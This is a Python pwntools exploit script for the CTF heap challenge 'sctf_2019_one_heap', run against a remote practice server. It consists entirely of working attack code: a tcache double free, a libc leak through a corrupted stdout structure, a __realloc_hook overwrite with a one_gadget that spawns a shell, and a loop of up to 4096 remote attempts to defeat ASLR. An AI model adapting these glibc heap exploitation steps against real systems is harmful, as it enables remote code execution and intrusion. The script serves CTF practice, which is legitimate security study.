from pwn import *

# sh:tube = process("./sctf_2019_one_heap")
context.update(arch="amd64", os="linux", endian="little")
sh = remote("node3.buuoj.cn", 26663)
cur_elf = ELF("./sctf_2019_one_heap")
libc = cur_elf.libc

def LOG_ADDR(*args):
    pass

context.update(arch="amd64", os="linux", endian="little")

def new_note(size, content="id"):
    sh.sendlineafter("Your choice:", '1')
    sh.sendlineafter("Input the size:", str(size))
    sh.sendlineafter("Input the content:", content)


def del_note():
    sh.sendlineafter("Your choice:", '2')

def attack(first, second):
    new_note(0x70)
    del_note()
    del_note()

    new_note(0x70, p16((first << 8) | 0x10))
    new_note(0x70)
    layout = [0, 0, 0, 0, 0x07000000]
    new_note(0x70, flat(layout))
    del_note()

    new_note(0x40, p64(0) * 5)

    new_note(0x10, flat(0, p16((second << 8) | 0x60)))
    del_note()

    new_note(0x40, flat(0xfbad1887, 0, 0, 0, "\x58"))
    msg = sh.recvn(8)
    leak_addr = u64(msg)
    LOG_ADDR("leak_addr", leak_addr)
    libc_base_addr = leak_addr - 0x3e82a0
    realloc_hook_addr = libc_base_addr + libc.sym["__realloc_hook"]
    realloc_addr = libc_base_addr + libc.sym["realloc"]

    gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
    one_gadget = libc_base_addr + gadgets[2]
    new_note(0x10, flat(0, p64(realloc_hook_addr)[:6]))

    new_note(0x40, flat(one_gadget, realloc_addr+0x4))

    new_note(0x10)
    try:
        sh.sendline("id")
        sh.recvline_contains("uid", timeout=2)
        sh.sendline("cat flag")
        sh.interactive()
    except:
        try:
            sh.close()
        except:
            pass

if __name__ == "__main__":
    n = 0x1000
    while n > 0:
        log.success("counts: {}".format(0x1000 - n))
        try:
            attack(0x60, 0x67)
        except:
            pass
        # sh = process("./sctf_2019_one_heap")
        sh = remote("node3.buuoj.cn", 26663)
        n -= 1